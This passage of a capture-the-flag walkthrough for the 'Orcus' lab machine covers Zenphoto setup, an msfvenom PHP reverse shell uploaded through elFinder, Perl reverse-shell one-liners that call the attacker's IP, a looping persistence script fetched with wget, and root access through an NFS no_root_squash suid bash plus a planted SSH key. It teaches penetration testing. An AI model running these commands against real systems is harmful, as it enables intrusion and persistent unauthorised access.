+<div>Accessing /zenphoto redirects us to a "Zenphoto Setup" page. The setup page shows an error with the database configuration.</div>
+<div><br /></div>
+<div><img height="814" src="/assets/images/2019-04-15-hackfest2016-orcus/BB2FD9E2-2A18-4537-9CFA-F1333D96DB85.png" width="1664" /><br /></div>
+<div><br /></div>
+<div>Before messing too much with this, I check the exploit database to see if Zenphoto is a typically vulnerable piece of software and...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# searchsploit zenphoto</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div> Exploit Title                                                                                               |  Path</div>
+    <div>                                                                                                             | (/usr/share/exploitdb/)</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div>ZenPhoto - 'admin-news-articles.php' Cross-Site Scripting                                                    | exploits/php/webapps/37903.txt</div>
+    <div>ZenPhoto - 'index.php' SQL Injection                                                                         | exploits/php/webapps/38326.txt</div>
+    <div>ZenPhoto - Config Update / Command Execution                                                                 | exploits/php/webapps/15114.php</div>
+    <div>ZenPhoto - SQL Injection                                                                                     | exploits/php/webapps/39062.txt</div>
+    <div>ZenPhoto 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                            | exploits/php/webapps/27795.txt</div>
+    <div>ZenPhoto 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                 | exploits/php/webapps/27796.txt</div>
+    <div>ZenPhoto 1.1.3 - 'rss.php?albumnr' SQL Injection                                                             | exploits/php/webapps/4823.pl</div>
+    <div>ZenPhoto 1.2.5 - Completely Blind SQL Injection                                                              | exploits/php/webapps/9154.js</div>
+    <div>ZenPhoto 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                            | exploits/php/webapps/34611.txt</div>
+    <div>ZenPhoto 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                     | exploits/php/webapps/34610.txt</div>
+    <div>ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                             | exploits/php/webapps/35648.txt</div>
+    <div>ZenPhoto 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                               | exploits/php/webapps/17200.txt</div>
+    <div>ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                            | exploits/php/webapps/18083.php</div>
+    <div>ZenPhoto 1.4.10 - Local File Inclusion                                                                       | exploits/php/webapps/38841.txt</div>
+    <div>ZenPhoto 1.4.11 - Remote File Inclusion                                                                      | exploits/php/webapps/39571.txt</div>
+    <div>ZenPhoto 1.4.3.3 - Multiple Vulnerabilities                                                                  | exploits/php/webapps/22524.txt</div>
+    <div>ZenPhoto 1.4.8 - Multiple Vulnerabilities                                                                    | exploits/php/webapps/37602.txt</div>
+    <div>ZenPhoto CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                       | exploits/php/webapps/14359.html</div>
+    <div>ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                   | exploits/php/webapps/9166.txt</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div>Shellcodes: No Result</div>
+</div>
+<div><br /></div>
+<div>YES! Yes, it is. 🙂</div>
+<div><br /></div>
+<div>Since we know we have valid database credentials (that are fully privileged), we decide we should get Zenphoto up and running.</div>
+<div><br /></div>
+<div>We enter our database credentials and click Save.</div>
+<div><br /></div>
+<div><img height="1250" src="/assets/images/2019-04-15-hackfest2016-orcus/0903B3F9-7B01-4E44-BD30-8AB92E86BF84.png" width="1668" /><br /></div>
+<div><br /></div>
+<div>When the page refreshes, it looks like everything is green and good to Go... so we click Go...</div>
+<div><br /></div>
+<div><img height="1370" src="/assets/images/2019-04-15-hackfest2016-orcus/F5B36C17-427D-4BD1-946F-A9CC58B98A33.png" width="1646" /><br /></div>
+<div><br /></div>
+<div>The next step appears to be setting my "admin user and password"...</div>
+<div><br /></div>
+<div><img height="870" src="/assets/images/2019-04-15-hackfest2016-orcus/82353916-EFE5-4409-AD10-0F85661DF033.png" width="1658" /><br /></div>
+<div><br /></div>
+<div>After agreeing to the terms and conditions, of course...</div>
+<div><br /></div>
+<div><img height="494" src="/assets/images/2019-04-15-hackfest2016-orcus/2ACBFCB6-41C7-4530-A47B-C36AEC802F7D.png" width="712" /><br /></div>
+<div><br /></div>
+<div>I fill out my admin details and click Apply</div>
+<div><br /></div>
+<div><img height="1348" src="/assets/images/2019-04-15-hackfest2016-orcus/43EA945C-85FF-4490-936A-12D1B1BD39FF.png" width="1572" /><br /></div>
+<div><br /></div>
+<div>Time to login...</div>
+<div><br /></div>
+<div><img height="852" src="/assets/images/2019-04-15-hackfest2016-orcus/6B3B1A4F-53B3-4CCD-95D2-3F6EC8940C16.png" width="834" /><br /></div>
+<div><br /></div>
+<div>Once logged in, I go to the Overview tab and see what version of Zenphoto we are running.</div>
+<div><br /></div>
+<div><img height="542" src="/assets/images/2019-04-15-hackfest2016-orcus/60B7C518-BD18-49DD-AD68-00BFE819821E.png" width="1058" /><br /></div>
+<div><br /></div>
+<div>Great, the exploit database has a known issue with our version.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>ZenPhoto 1.4.10 - Local File Inclusion                                                                       | exploits/php/webapps/38841.txt</div>
+</div>
+<div><br /></div>
+<div>Using the proof-of-concept (PoC) code in the exploit database TXT file, I'm not actually able to get the LFI vulnerability to work. I try (which comes directly from the PoC)...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp/phpinfo</div>
+</div>
+<div><br /></div>
+<div>As well as...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../../../../../etc/passwd</div>
+</div>
+<div><br /></div>
+<div>Both error out. I decided to try to download the Zenphoto source code to see what the pluginDoc.php page was doing and how to get the LFI working. After jumping through hoops on the Zenphoto website, I finally found where I could download previous versions from their GitHub repo.</div>
+<div><br /></div>
+<div><a href="https://github.com/zenphoto/zenphoto/releases/tag/zenphoto-1.4.10" target="_blank">https://github.com/zenphoto/zenphoto/releases/tag/zenphoto-1.4.10</a></div>
+<div><br /></div>
+<div><img height="714" src="/assets/images/2019-04-15-hackfest2016-orcus/B63DD3DF-E6E2-4B0F-A15B-86ACC3B417CF.png" width="2000" /><br /></div>
+<div><br /></div>
+<div>Looking at the source code for pluginDoc.php, the extension parameter is captured, "sanitized" and then a path is built using the parameter + '.php'. So, we have to target .php files to get the LFI vulnerability to work.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[snip]</div>
+    <div>        $extension = sanitize($_GET['extension']);</div>
+    <div>        $thirdparty = isset($_GET['thirdparty']);</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>        if ($thirdparty) {</div>
+    <div>                $pluginToBeDocPath = SERVERPATH . '/' . USER_PLUGIN_FOLDER . '/' . $extension . '.php';</div>
+    <div>        } else {</div>
+    <div>                $pluginToBeDocPath = SERVERPATH . '/' . ZENFOLDER . '/' . PLUGIN_FOLDER . '/' . $extension . '.php';</div>
+    <div>        }</div>
+</div>
+<div><br /></div>
+<div>That might be useful, but let's see what else Zenphoto can do for us.</div>
+<div><br /></div>
+<div>Checking out the Plugins tab in Zenphoto reveals lots of goodies. Of special note is the "Uploader" tab. That sounds like what we need.</div>
+<div><br /></div>
+<div><img height="1356" src="/assets/images/2019-04-15-hackfest2016-orcus/D867EBA4-4479-4CB8-A2A8-9C43AD4F46FF.png" width="2572" /><br /></div>
+<div><br /></div>
+<div>It looks like the two uploaders that are already enabled are only for images. The elFinder plugin looks to be more robust and even has some known issues (according to the exploit database), so let's enable that one.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# searchsploit elFinder</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div> Exploit Title                                                                                               |  Path</div>
+    <div>                                                                                                             | (/usr/share/exploitdb/)</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div>elFinder 2 - Remote Command Execution (via File Creation)                                                    | exploits/php/webapps/36925.py</div>
+    <div>elFinder 2.1.47 - 'PHP connector' Command Injection                                                          | exploits/php/webapps/46481.py</div>
+    <div>elFinder PHP Connector &lt; 2.1.48 - 'exiftran' Command Injection (Metasploit)                                  | exploits/php/remote/46539.rb</div>
+    <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+    <div>Shellcodes: No Result</div>
+</div>
+<div><br /></div>
+<div>We can access our newly enabled Uploader plugin from the Upload tab.</div>
+<div><br /></div>
+<div><img height="1276" src="/assets/images/2019-04-15-hackfest2016-orcus/CD1F6471-F421-4D7B-8F82-668F3D030CD1.png" width="564" /><br /></div>
+<div><br /></div>
+<div>It looks like the default location elFinder uses is /zenphoto/uploaded...</div>
+<div><br /></div>
+<div><img height="1320" src="/assets/images/2019-04-15-hackfest2016-orcus/DA94E6A1-C5A7-4D91-BAF4-ED16695AD8A1.png" width="972" /><br /></div>
+<div><br /></div>
+<div>...which we have directory listing available for.</div>
+<div><br /></div>
+<div><img height="366" src="/assets/images/2019-04-15-hackfest2016-orcus/ACD82DCE-7A3A-4C45-A12F-F9B5D5063F58.png" width="802" /><br /></div>
+<div><br /></div>
+<div>Let's build our PHP reverse shell with msfvenom and upload it.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 3035 bytes</div>
+</div>
+<div><br /></div>
+<div><img height="846" src="/assets/images/2019-04-15-hackfest2016-orcus/4E64EA50-EAD3-4917-9522-20F0899D7F78.png" width="784" /><br /></div>
+<div><br /></div>
+<div>Now that the reverse shell is on the server and accessible, we need to start our Metasploit listener. I'm actually going to start two listeners. One for the PHP reverse shell, and one for the Perl reverse shell I'll create as soon as the PHP shell session starts. I'm doing this because the PHP reverse shell will quickly timeout and I want a more stable connection.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 1.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
+</div>
+<div><br /></div>
+<div>I use curl to start the PHP reverse shell session...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# curl http://10.183.0.220/zenphoto/uploaded/rev.php</div>
+</div>
+<div><br /></div>
+<div>Worked! I connect to the session and start my perl reverse shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.220:59382) at 2019-04-16 16:06:45 -0400</div>
+    <div>
+        <div><br /></div>
+        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    </div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/var/www/html/zenphoto/uploaded</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.220:57200) at 2019-04-16 16:07:13 -0400</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/var/www/html/zenphoto/uploaded$ grep `whoami` /etc/passwd</div>
+    <div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
+</div>
+<div><br /></div>
+<div>The home directory exists, but only allows writes by root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>drwxr-xr-x  4 root root   4096 Oct 22  2016 www</div>
+</div>
+<div><br /></div>
+<div>The default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div>
+<div><br /></div>
+<div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# cat thumb</div>
+    <div>#!/bin/sh</div>
+    <div>while true; do</div>
+    <div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+    <div>    # sleep for 300 seconds (5 mins)</div>
+    <div>    sleep 300</div>
+    <div>done</div>
+</div>
+<div><br /></div>
+<div>I uploaded the script to the victim's /var/www/html/zenphoto/cache directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/var/www/html/zenphoto/cache$ wget -O thumb 10.183.0.222:4321/thumb</div>
+    <div>&lt;l/zenphoto/cache$ wget -O thumb 10.183.0.222:4321/thumb                     </div>
+    <div>--2019-04-16 16:26:34--  http://10.183.0.222:4321/thumb</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 307 [application/octet-stream]</div>
+    <div>Saving to: 'thumb'</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>thumb               100%[===================&gt;]     307  --.-KB/s    in 0s      </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>2019-04-16 16:26:34 (59.0 MB/s) - 'thumb' saved [307/307]</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>www-data@Orcus:/var/www/html/zenphoto/cache$ chmod +x thumb</div>
+    <div>chmod +x thumb</div>
+    <div>www-data@Orcus:/var/www/html/zenphoto/cache$ ./thumb &amp;</div>
+    <div>./thumb &amp;</div>
+    <div>[1] 21552</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Several of the services we detected in the initial scanning were related to NFS. We can see remotely that the server has an NFS export for /tmp that allows anyone to connect.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# showmount -e 10.183.0.220</div>
+    <div>Export list for 10.183.0.220:</div>
+    <div>/tmp *</div>
+</div>
+<div><br /></div>
+<div>Now that we have a local shell, we can also see that root squashing is not enabled for the share.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/etc$ cat /etc/exports</div>
+    <div>cat /etc/exports</div>
+    <div># /etc/exports: the access control list for filesystems which may be exported</div>
+    <div>#               to NFS clients.  See exports(5).</div>
+    <div>#</div>
+    <div># Example for NFSv2 and NFSv3:</div>
+    <div># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</div>
+    <div>#</div>
+    <div># Example for NFSv4:</div>
+    <div># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</div>
+    <div># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</div>
+    <div>#</div>
+    <div>/tmp *(rw,no_root_squash)</div>
+</div>
+<div><br /></div>
+<div>This means we can mount the share on our attacker machine and use our root access there to create suid files on the victim and easily gain root access.</div>
+<div><br /></div>
+<div>We start by copying /bin/bash to the /tmp directory on the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/etc$ cd /tmp</div>
+    <div>www-data@Orcus:/tmp$ which bash</div>
+    <div>/bin/bash</div>
+    <div>www-data@Orcus:/tmp$ cp /bin/bash .</div>
+</div>
+<div><br /></div>
+<div>Now, on our attacking machine we mount the /tmp directory locally.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# mkdir tmp</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# mount -t nfs 10.183.0.220:/tmp tmp</div>
+</div>
+<div><br /></div>
+<div>Now all we have to do is move to the tmp directory, change the owner of the bash file we copied and set the "sticky" bit to allow normal users to execute it as root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus# cd tmp</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# chown root bash</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# chmod u+s bash</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# ll</div>
+    <div>total 1.1M</div>
+    <div>-rwsr-xr-x 1 root www-data 1.1M Apr 16 17:38 bash</div>
+</div>
+<div><br /></div>
+<div>Back on the victim...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Orcus:/tmp$ ./bash -p</div>
+    <div>bash-4.3# id</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</div>
+</div>
+<div><br /></div>
+<div>Why does this work? What does '-p' mean? From the bash man page.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>If  the  shell  is  started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no</div>
+    <div>startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE  variables,</div>
+    <div>if  they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at in‐</div>
+    <div>vocation, the startup behavior is the same, <b><u>but the effective user id is not reset</u></b>.</div>
+</div>
+<div><br /></div>
+<div>As you can see from the output of the 'id' command, the effective user id (euid) is 0 (root).</div>
+<div><br /></div>
+<div>Now we get the flag from /root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cd /root</div>
+    <div>bash-4.3# cat flag.txt</div>
+    <div>cat flag.txt</div>
+    <div>807307b49314f822985d0410de7d8bfe</div>
+</div>
+<div><br /></div>
+<div>To do some more digging, we will also add our ssh key to the /root/.ssh/authorized_keys file so we can get a nice shell.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cd .ssh</div>
+    <div>bash-4.3# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCVjc6rm8+ORrWgwf/6RjxhodRe2yTTih+gyI0apQOW1XJs3jzoQahnXMORD+nkBRd9Cg5xyT0LTCBDI/+qNbXb4V1jAKIiZiA6+ZQsXQYqf8aA6S6ElaaAehUWqlUzoixFWPBsGKOdGclhIlgS4nndho8fVK3fy260hy4/T/oM//fO+RkAjkPVDh42UU2S98QKR2meCtj8YDOi9t3Wm4PsEutaiYPi4sjtTNvaJ7Y2VRNy3jPqcs0bCDAhK5poNFxAS7FaL+/Kb/zsP5gF9WuvtGRzWJp7q+lOPYcfhN9cAKlxMKMxC/bGLuyGf2IOGc2VGekmwf6AOr86B6zMm6pT root@kali" &gt;&gt; authorized_keys</div>
+</div>
+<div><br /></div>
+<div>Once we SSH in, we could also edit root's crontab to further "maintain access"... but we aren't planning to spend too much longer on this.</div>
+<div><br /></div>
+<div>Before we SSH in, though, it should be noted that we found SSH services listening on both TCP port 22 and TCP port 443. In the /etc/passwd file we see a user named 'kippo'. Googling kippo, we find "Kippo is a medium-interaction SSH honeypot written in Python."</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.3# cat /etc/passwd</div>
+    <div>[...]</div>
+    <div>kippo:x:1001:27::/home/kippo:/bin/bash</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
